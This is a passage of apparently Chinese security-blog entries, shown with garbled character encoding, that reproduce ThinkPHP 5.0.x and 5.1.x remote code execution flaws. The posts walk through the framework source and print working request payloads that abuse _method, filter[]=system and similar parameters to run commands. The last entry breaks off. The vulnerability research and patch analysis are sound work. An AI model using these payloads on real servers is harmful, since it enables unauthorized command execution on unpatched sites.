alt="image283"></p><p>å’Œ5.0.xç‰ˆæœ¬çš„æ¼æ´æœ‰ç€ç›¸ä¼¼ä¹‹å¤„,éƒ½æ˜¯<code>$this-&gt;method</code>æ–¹æ³•æœªè¿‡æ»¤å¯¼è‡´çš„ä»»æ„å˜é‡è¦†ç›–,ä»è€Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p><p>é€šè¿‡<code>$_POST[&#39;_method&#39;]=xxxxx</code>æ¥è¿›è¡Œä»»æ„å˜é‡è¦†ç›–</p><p>æˆ‘ä»¬é€‰æ‹©è¦†ç›–<code>$this-&gt;filter</code>,ç¿»æ‰¾Requestç±»ä¸­çš„å‡½æ•°å‘ç°è¿˜æ˜¯<code>Request::input</code>å¤„å¯ä»¥å‘½ä»¤æ‰§è¡Œ,ä¸‹æ–­ç‚¹å¯ä»¥çœ‹åˆ°è°ƒç”¨å †æ ˆ</p><p><img src="https://i.loli.net/2020/01/30/dVyPeZHbYM3TFq7.png" alt="image527"></p><p>æˆ‘ä»¬ä»<code>Request::param</code>å¤„å¼€å§‹åˆ†æ</p><pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (!$this-&gt;mergeParam) {            $method = $this-&gt;method(true);            // è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡            switch ($method) {                case &#39;POST&#39;:                    $vars = $this-&gt;post(false);                    break;                case &#39;PUT&#39;:                case &#39;DELETE&#39;:                case &#39;PATCH&#39;:                    $vars = $this-&gt;put(false);                    break;                default:                    $vars = [];            }            // å½“å‰è¯·æ±‚å‚æ•°å’ŒURLåœ°å€ä¸­çš„å‚æ•°åˆå¹¶            $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));            $this-&gt;mergeParam = true;        }        ...    }</code></pre><p>å› ä¸ºæ˜¯POSTè¯·æ±‚æ‰€ä»¥ä¼šè¿›å…¥POSTåˆ†æ”¯,è·Ÿè¿›<code>Request::post</code></p><pre><code class="php">    public function post($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (empty($this-&gt;post)) {            $this-&gt;post = !empty($_POST) ? $_POST : $this-&gt;getInputData($this-&gt;input);        }        return $this-&gt;input($this-&gt;post, $name, $default, $filter);    }</code></pre><p>æ¥ç€ä¾¿ä¼šè°ƒç”¨<code>Request::input</code>,å…¶ä¸­<code>$this-&gt;post</code>å’Œ<code>$filter</code>å¯æ§</p><p>è·Ÿè¿›<code>Request::input</code></p><pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        ...        // è§£æè¿‡æ»¤å™¨        $filter = $this-&gt;getFilter($filter, $default);        if (is_array($data)) {            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);            reset($data);        } else {            $this-&gt;filterValue($data, $name, $filter);        }       ...    }</code></pre><p>å› ä¸º<code>$data</code>æ˜¯æ•°ç»„(<code>$_POST</code>),è°ƒç”¨<code>array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</code></p><p>å¯¹<code>$data</code>ä¸­æ‰€æœ‰å€¼è°ƒç”¨<code>Request::filterValue</code></p><p>è·Ÿè¿›å»</p><pre><code class="php">private function filterValue(&amp;$value, $key, $filters)    {        $default = array_pop($filters);        foreach ($filters as $filter) {            if (is_callable($filter)) {                // è°ƒç”¨å‡½æ•°æˆ–è€…æ–¹æ³•è¿‡æ»¤                $value = call_user_func($filter, $value);            } elseif (is_scalar($value)) {                if (false !== strpos($filter, &#39;/&#39;)) {                    // æ­£åˆ™è¿‡æ»¤                    if (!preg_match($filter, $value)) {                        // åŒ¹é…ä¸æˆåŠŸè¿”å›é»˜è®¤å€¼                        $value = $default;                        break;                    }                } elseif (!empty($filter)) {                    // filterå‡½æ•°ä¸å­˜åœ¨æ—¶, åˆ™ä½¿ç”¨filter_varè¿›è¡Œè¿‡æ»¤                    // filterä¸ºéæ•´å½¢å€¼æ—¶, è°ƒç”¨filter_idå–å¾—è¿‡æ»¤id                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));                    if (false === $value) {                        $value = $default;                        break;                    }                }            }        }        return $value;    }</code></pre><p>é˜…è¯»ä»£ç å¯çŸ¥,filterValueä¼šå¯¹<code>$_POST</code>ä¸­æ‰€æœ‰å€¼è°ƒç”¨<code>$filter</code>ä¸­æ¯ä¸€ä¸ªå¯ä»¥è°ƒç”¨çš„å‡½æ•°æˆ–æ–¹æ³•</p><p>ä¸”<code>$filter</code>=<code>$_POST</code></p><p>å› æ­¤æœ‰</p><pre><code>http://127.0.0.1/public/POST:  var1=exec&amp;var2=calc.exe&amp;_method=filter</code></pre><h2 id="è¡¥ä¸åˆ†æ"><a href="#è¡¥ä¸åˆ†æ" class="headerlink" title="è¡¥ä¸åˆ†æ"></a>è¡¥ä¸åˆ†æ</h2><p>å¯¹methodè¿›è¡Œäº†ç™½åå•é™åˆ¶</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://www.smi1e.top/thinkphp-5-1-x5-2-xå…¨ç‰ˆæœ¬-rce-æ¼æ´åˆ†æ/" target="_blank" rel="noopener">https://www.smi1e.top/thinkphp-5-1-x5-2-xå…¨ç‰ˆæœ¬-rce-æ¼æ´åˆ†æ/</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š [<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 5.1.x-5.2.xå…¨ç‰ˆæœ¬RCE æ¼æ´åˆ†æ/](<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 5.1.x-5.2.xå…¨ç‰ˆæœ¬RCE æ¼æ´åˆ†æ/) <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 5.0.0~5.0.23 RCE æ¼æ´å¤ç°</title>
      <link href="/2020/01/30/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/01/30/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP-5-0-0-5-0-23-RCE-æ¼æ´å¤ç°"><a href="#ThinkPHP-5-0-0-5-0-23-RCE-æ¼æ´å¤ç°" class="headerlink" title="ThinkPHP 5.0.0~5.0.23 RCE æ¼æ´å¤ç°"></a>ThinkPHP 5.0.0~5.0.23 RCE æ¼æ´å¤ç°</h1><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p> ThinkPHP 5.0.0~5.0.23 </p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code>http://127.0.0.1/index.php?s=captchapost_ex1ï¼š_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoamipost_exp2ï¼š_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre><h2 id="è¿‡ç¨‹å¤ç°-exp1"><a href="#è¿‡ç¨‹å¤ç°-exp1" class="headerlink" title="è¿‡ç¨‹å¤ç°(exp1)"></a>è¿‡ç¨‹å¤ç°(exp1)</h2><p> ä»¥ thinkphp 5.0.22 å®Œæ•´ç‰ˆä¸ºå¤ç°ç¯å¢ƒ(ä¸ºå•¥è¦å®Œæ•´ç‰ˆç­‰ä¼šè¯´)ï¼Œä¸‹è½½åœ°å€ï¼š<a href="http://www.thinkphp.cn/down/1260.html" target="_blank" rel="noopener">http://www.thinkphp.cn/down/1260.html</a> </p><p> å®˜æ–¹è¡¥ä¸åœ°å€ï¼š<a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a> </p><p><img src="https://i.loli.net/2020/01/30/LohuXMViDeg9AxT.png" alt="image562"></p><p>å…¶ä¸­<code>$this-&gt;{$this-&gt;method}($_POST);</code>å¯ä»¥æ‰§è¡Œä»»æ„æ¥å—ä¸€ä¸ªæ•°ç»„çš„requestæ–¹æ³•,<code>$this-&gt;method</code>å¯ä»¥é€šè¿‡æ§åˆ¶<code>$_POST[&#39;_method&#39;]</code>æ¥æ§åˆ¶</p><p>æŸ¥æ‰¾ç›¸å…³æ–¹æ³•åé€‰å®š<code>__construct</code>æ¥ä¿®æ”¹requestå±æ€§å†ç»“åˆå…¶ä»–æ–¹æ³•å½¢æˆåˆ©ç”¨é“¾</p><pre><code class="php">protected function __construct($options = [])    {        foreach ($options as $name =&gt; $item) {            if (property_exists($this, $name)) {                $this-&gt;$name = $item;            }        }        if (is_null($this-&gt;filter)) {            $this-&gt;filter = Config::get(&#39;default_filter&#39;);        }        // ä¿å­˜ php://input        $this-&gt;input = file_get_contents(&#39;php://input&#39;);    }</code></pre><p>æŸ¥æ‰¾requestä¸­å¯èƒ½å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•æ—¶å‘ç°,input()æ–¹æ³•å¯ä»¥é€šè¿‡ä¿®æ”¹filteræ¥è¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœ</p><pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        ...        // è§£æè¿‡æ»¤å™¨        $filter = $this-&gt;getFilter($filter, $default);        if (is_array($data)) {            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);//å‘½ä»¤æ‰§è¡Œ            reset($data);        } else {            $this-&gt;filterValue($data, $name, $filter);        }        ...    }</code></pre><p><img src="https://i.loli.net/2020/01/30/Fp5XRUNjlxABPWt.png" alt="image1678"></p><p>æ¥ç€æŸ¥æ‰¾è°ƒç”¨method()çš„åœ°æ–¹,ä¸‹æ–­ç‚¹</p><p><img src="https://i.loli.net/2020/01/30/F6ZvjtxGdP7uiKa.png" alt="image1768"></p><p>ä»å…¥å£ç‚¹App.phpå¼€å§‹æŸ¥çœ‹å¯èƒ½ä½œä¸ºæ”»å‡»é“¾ä¸€éƒ¨åˆ†çš„åœ°æ–¹</p><p>èŠ‚é€‰App.phpå…³é”®å†…å®¹</p><pre><code class="php">public static function run(Request $request = null)    {        $request = is_null($request) ? Request::instance() : $request;        try {            ...            // è·å–åº”ç”¨è°ƒåº¦ä¿¡æ¯            $dispatch = self::$dispatch;            // æœªè®¾ç½®è°ƒåº¦ä¿¡æ¯åˆ™è¿›è¡Œ URL è·¯ç”±æ£€æµ‹            if (empty($dispatch)) {                $dispatch = self::routeCheck($request, $config);            }            // è®°å½•å½“å‰è°ƒåº¦ä¿¡æ¯            $request-&gt;dispatch($dispatch);            // è®°å½•è·¯ç”±å’Œè¯·æ±‚ä¿¡æ¯            ...            $data = self::exec($dispatch, $config);        } catch (HttpResponseException $exception) {            $data = $exception-&gt;getResponse();        }        ...    }</code></pre><p>è·Ÿè¿›routeCheck</p><pre><code class="php">public static function routeCheck($request, array $config)    {        $path   = $request-&gt;path();        $depr   = $config[&#39;pathinfo_depr&#39;];        $result = false;        // è·¯ç”±æ£€æµ‹        $check = !is_null(self::$routeCheck) ? self::$routeCheck : $config[&#39;url_route_on&#39;];        if ($check) {            ...            $result = Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);            ...        }        ...        return $result;    }</code></pre><p>è·Ÿè¿›check,åœ¨è·å–methodæ—¶è°ƒç”¨äº†methodæ–¹æ³•</p><pre><code class="php">public static function check($request, $url, $depr = &#39;/&#39;, $checkDomain = false)    {        //æ£€æŸ¥è§£æç¼“å­˜        ...        $method = strtolower($request-&gt;method());        // è·å–å½“å‰è¯·æ±‚ç±»å‹çš„è·¯ç”±è§„åˆ™       ...    }</code></pre><p>è¿”å›App.php,æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ªæ•æ„Ÿçš„å‡½æ•°<code>$data = self::exec($dispatch, $config);</code></p><p>è·Ÿè¿›execç§ä¸€ç§</p><pre><code class="php">protected static function exec($dispatch, $config)    {        switch ($dispatch[&#39;type&#39;]) {            case &#39;redirect&#39;: // é‡å®šå‘è·³è½¬                $data = Response::create($dispatch[&#39;url&#39;], &#39;redirect&#39;)                    -&gt;code($dispatch[&#39;status&#39;]);                break;            case &#39;module&#39;: // æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ                $data = self::module(                    $dispatch[&#39;module&#39;],                    $config,                    isset($dispatch[&#39;convert&#39;]) ? $dispatch[&#39;convert&#39;] : null                );                break;            case &#39;controller&#39;: // æ‰§è¡Œæ§åˆ¶å™¨æ“ä½œ                $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);                $data = Loader::action(                    $dispatch[&#39;controller&#39;],                    $vars,                    $config[&#39;url_controller_layer&#39;],                    $config[&#39;controller_suffix&#39;]                );                break;            case &#39;method&#39;: // å›è°ƒæ–¹æ³•                $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);                $data = self::invokeMethod($dispatch[&#39;method&#39;], $vars);                break;            case &#39;function&#39;: // é—­åŒ…                $data = self::invokeFunction($dispatch[&#39;function&#39;]);                break;            case &#39;response&#39;: // Response å®ä¾‹                $data = $dispatch[&#39;response&#39;];                break;            default:                throw new \InvalidArgumentException(&#39;dispatch type not support&#39;);        }        return $data;    }</code></pre><p>å¦‚æœ<code>$dispatch[&#39;type&#39;]=&#39;controller&#39; or &#39;method&#39;</code>æ—¶ä¼šè°ƒç”¨<code>Request::instance()-&gt;param()</code></p><pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (empty($this-&gt;mergeParam)) {            $method = $this-&gt;method(true);            // è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡            ...            $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));            $this-&gt;mergeParam = true;        }        ...        return $this-&gt;input($this-&gt;param, $name, $default, $filter);    }</code></pre><p>è€Œparamåˆ™ä¼šè°ƒç”¨inputä»è€Œå½¢æˆå®Œæ•´çš„æ”»å‡»é“¾,å…¶ä¸­<code>$filter</code>æ—¶æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤,<code>$this-&gt;param</code>åˆ™æ˜¯å‚æ•°,</p><p><code>$this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</code></p><p>ä½†æ˜¯æˆ‘ä»¬ä¸èƒ½ç›´æ¥é€šè¿‡ä¿®æ”¹<code>__construct</code>æ¥ä¿®æ”¹param,å› ä¸ºåœ¨è¿è¡Œè¿‡ç¨‹ä¸­<code>$this-&gt;param</code>ä¼šè¢«è¦†ç›–,ä½†æ˜¯<code>$this-&gt;get</code>å´ä¸ä¼š,äºæ˜¯æˆ‘ä»¬éœ€è¦è¦†ç›–<code>$this-&gt;filter</code>å’Œ<code>$this-&gt;get</code></p><p>æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•è®©<code>$dispatch[&#39;type&#39;]=&#39;controller&#39; or &#39;method&#39;</code>çš„é—®é¢˜äº†</p><p><img src="https://i.loli.net/2020/01/30/qeliaZJokYSUMg2.png" alt="image5781"></p><p>è¿™ä¹Ÿæ˜¯ä¸ºå•¥è¦tpå®Œæ•´ç‰ˆçš„åŸå› ,å®Œæ•´ç‰ˆé‡Œæ‰æœ‰captchaæ¨¡å—</p><blockquote><p>æ³¨æ„æˆ‘ä»¬è¯·æ±‚çš„è·¯ç”±æ˜¯<code>?s=captcha</code>ï¼Œå®ƒå¯¹åº”çš„æ³¨å†Œè§„åˆ™ä¸º<code>\think\Route::get</code>ã€‚åœ¨<code>method</code>æ–¹æ³•ç»“æŸåï¼Œè¿”å›çš„<code>$this-&gt;method</code>å€¼åº”ä¸º<code>get</code>è¿™æ ·æ‰èƒ½ä¸å‡ºé”™ï¼Œæ‰€ä»¥payloadä¸­æœ‰ä¸ª<code>method=get</code> </p></blockquote><p>äºæ˜¯æœ€åçš„payloadæ˜¯</p><pre><code>http://127.0.0.1/index.php?s=captcha_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code></pre><h2 id="è¿‡ç¨‹å¤ç°-exp2"><a href="#è¿‡ç¨‹å¤ç°-exp2" class="headerlink" title="è¿‡ç¨‹å¤ç°(exp2)"></a>è¿‡ç¨‹å¤ç°(exp2)</h2><p>æ”»å‡»é“¾çš„å‰é¢åŸºæœ¬ç›¸åŒ,åªæœ‰è°ƒç”¨<code>Request::input</code>æ–¹æ³•çš„åœ°æ–¹ä¸åŒè€Œè¿›å…¥ä¸åŒåˆ†æ”¯</p><p>æˆ‘ä»¬çœ‹åˆ°<code>Request::param</code>æ–¹æ³•</p><pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (empty($this-&gt;mergeParam)) {            $method = $this-&gt;method(true);            // è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡            ...            $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));            $this-&gt;mergeParam = true;        }        ...        return $this-&gt;input($this-&gt;param, $name, $default, $filter);    }</code></pre><p>æ³¨æ„è¿™ä¸€ä¸ª<code>$this-&gt;method(true);</code></p><p><code>Request::method</code></p><pre><code class="php">    public function method($method = false)    {        if (true === $method) {            // è·å–åŸå§‹è¯·æ±‚ç±»å‹            return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;        }         ...    }</code></pre><p>å®ƒä¼šè°ƒç”¨<code>Request::server</code>,è€Œè¿™ä¸ªæ–¹æ³•ä¹Ÿä¼šè°ƒç”¨<code>Request::input</code></p><pre><code class="php">public function server($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (empty($this-&gt;server)) {            $this-&gt;server = $_SERVER;        }        if (is_array($name)) {            return $this-&gt;server = array_merge($this-&gt;server, $name);        }        return $this-&gt;input($this-&gt;server, false === $name ? false : strtoupper($name), $default, $filter);    }</code></pre><p>ç»§ç»­åˆ†æä»£ç å‘ç°,rceçš„å‚æ•°å˜ä¸ºäº†<code>$this-&gt;server[&#39;REQUEST_METHOD&#39;]</code></p><pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (&#39;&#39; != $name) {            // è§£æname            if (strpos($name, &#39;/&#39;)) {                list($name, $type) = explode(&#39;/&#39;, $name);            } else {                $type = &#39;s&#39;;            }            // æŒ‰.æ‹†åˆ†æˆå¤šç»´æ•°ç»„è¿›è¡Œåˆ¤æ–­            foreach (explode(&#39;.&#39;, $name) as $val) {                if (isset($data[$val])) {                    $data = $data[$val];                } else {                    // æ— è¾“å…¥æ•°æ®ï¼Œè¿”å›é»˜è®¤å€¼                    return $default;                }            }            if (is_object($data)) {                return $data;            }        }        // è§£æè¿‡æ»¤å™¨        $filter = $this-&gt;getFilter($filter, $default);        ...        return $data;    }</code></pre><p>äºæ˜¯æœ‰</p><pre><code class="php">http://127.0.0.1/public/index.php?s=captchaPOST:_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="[https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/](https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-æ¼æ´åˆ†æ/)">Smi1e â€”- ThinkPHP 5.0.0~5.0.23 RCE æ¼æ´åˆ†æ</a></p><p> <a href="https://xz.aliyun.com/t/3845#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845#toc-2</a> </p><p> <a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š [<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 5.0.0<del>5.0.23 RCE æ¼æ´å¤ç°/](<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 5.0.0</del>5.0.23 RCE æ¼æ´å¤ç°/) <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tp5rceå¤ç°</title>
      <link href="/2020/01/28/tp5rce%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/01/28/tp5rce%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="tp5rceå¤ç°"><a href="#tp5rceå¤ç°" class="headerlink" title="tp5rceå¤ç°"></a>tp5rceå¤ç°</h1><h2 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h2><blockquote><h3 id="æœ¬æ¬¡ç‰ˆæœ¬æ›´æ–°ä¸»è¦æ¶‰åŠä¸€ä¸ªå®‰å…¨æ›´æ–°ï¼Œç”±äºæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ä¼šå¯¼è‡´åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹å¯èƒ½çš„getshellæ¼æ´ï¼Œå—å½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬5-0-23å’Œ5-1-31ä¹‹å‰çš„æ‰€æœ‰ç‰ˆæœ¬ï¼Œæ¨èå°½å¿«æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚"><a href="#æœ¬æ¬¡ç‰ˆæœ¬æ›´æ–°ä¸»è¦æ¶‰åŠä¸€ä¸ªå®‰å…¨æ›´æ–°ï¼Œç”±äºæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ä¼šå¯¼è‡´åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹å¯èƒ½çš„getshellæ¼æ´ï¼Œå—å½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬5-0-23å’Œ5-1-31ä¹‹å‰çš„æ‰€æœ‰ç‰ˆæœ¬ï¼Œæ¨èå°½å¿«æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚" class="headerlink" title="æœ¬æ¬¡ç‰ˆæœ¬æ›´æ–°ä¸»è¦æ¶‰åŠä¸€ä¸ªå®‰å…¨æ›´æ–°ï¼Œç”±äºæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ä¼šå¯¼è‡´åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹å¯èƒ½çš„getshellæ¼æ´ï¼Œå—å½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬5.0.23å’Œ5.1.31ä¹‹å‰çš„æ‰€æœ‰ç‰ˆæœ¬ï¼Œæ¨èå°½å¿«æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚"></a>æœ¬æ¬¡ç‰ˆæœ¬æ›´æ–°ä¸»è¦æ¶‰åŠä¸€ä¸ªå®‰å…¨æ›´æ–°ï¼Œç”±äºæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ä¼šå¯¼è‡´åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹å¯èƒ½çš„getshellæ¼æ´ï¼Œå—å½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬5.0.23å’Œ5.1.31ä¹‹å‰çš„æ‰€æœ‰ç‰ˆæœ¬ï¼Œæ¨èå°½å¿«æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚</h3><p><strong>å¦‚æœæš‚æ—¶æ— æ³•æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œè¯·å¼€å¯å¼ºåˆ¶è·¯ç”±å¹¶æ·»åŠ ç›¸åº”æœªå®šä¹‰è·¯ç”±ï¼Œæˆ–è€…å‚è€ƒcommitçš„ä¿®æ”¹ å¢åŠ ç›¸å…³ä»£ç ã€‚</strong></p><p>â€“æ¥è‡ªthinkphpå®˜ç½‘</p></blockquote><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>æ ¹æ®å®˜æ–¹çš„å…¬å‘Šå»å¯»æ‰¾ç›¸å…³commitå‘ç°æ¼æ´ä½ç½®</p><p><img src="https://i.loli.net/2020/01/28/5EDWfFXvmqSuJk3.png" alt="image302"></p><p>æŸ¥çœ‹æ‰€æœ‰è°ƒç”¨controllerçš„å‡½æ•°å‘ç°æœ‰ä¸ªæ•æ„Ÿçš„å‡½æ•°åexec,ä¸è¿‡è¿™ä¸ªæ˜¯tpè‡ªå·±å®ç°çš„</p><pre><code class="php">    public function exec()    {        // ç›‘å¬module_init        $this-&gt;app[&#39;hook&#39;]-&gt;listen(&#39;module_init&#39;);        try {            // å®ä¾‹åŒ–æ§åˆ¶å™¨            $instance = $this-&gt;app-&gt;controller($this-&gt;controller,                $this-&gt;rule-&gt;getConfig(&#39;url_controller_layer&#39;),                $this-&gt;rule-&gt;getConfig(&#39;controller_suffix&#39;),                $this-&gt;rule-&gt;getConfig(&#39;empty_controller&#39;));            if ($instance instanceof Controller) {                $instance-&gt;registerMiddleware();            }        } catch (ClassNotFoundException $e) {            throw new HttpException(404, &#39;controller not exists:&#39; . $e-&gt;getClass());        }    ...    }</code></pre><p>è·Ÿè¿›controller</p><pre><code class="php">    public function controller($name, $layer = &#39;controller&#39;, $appendSuffix = false, $empty = &#39;&#39;)    {        list($module, $class) = $this-&gt;parseModuleAndClass($name, $layer, $appendSuffix);        if (class_exists($class)) {            return $this-&gt;__get($class);        } elseif ($empty &amp;&amp; class_exists($emptyClass = $this-&gt;parseClass($module, $layer, $empty, $appendSuffix))) {            return $this-&gt;__get($emptyClass);        }        throw new ClassNotFoundException(&#39;class not exists:&#39; . $class, $class);    }</code></pre><p>å†è·Ÿè¿›parseModuleAndClass</p><pre><code class="php">protected function parseModuleAndClass($name, $layer, $appendSuffix)    {        if (false !== strpos($name, &#39;\\&#39;)) {            $class  = $name;//å­˜åœ¨\            $module = $this-&gt;request-&gt;module();        } else {            if (strpos($name, &#39;/&#39;)) {                list($module, $name) = explode(&#39;/&#39;, $name, 2);            } else {                $module = $this-&gt;request-&gt;module();            }            $class = $this-&gt;parseClass($module, $layer, $name, $appendSuffix);        }        return [$module, $class];    }</code></pre><p>å¦‚æœå­˜åœ¨\åˆ™ç›´æ¥è¿”å›æ•°æ®,å…¶ä¸­<code>$name</code>æ˜¯æˆ‘ä»¬å¯æ§å†…å®¹,è€Œ<code>$name</code>ä¹Ÿæ°å¥½æ˜¯ç±»å,äºæ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨å‘½åç©ºé—´\ç±»æ¥è¿›è¡Œæ•æ„Ÿæ“ä½œ</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" 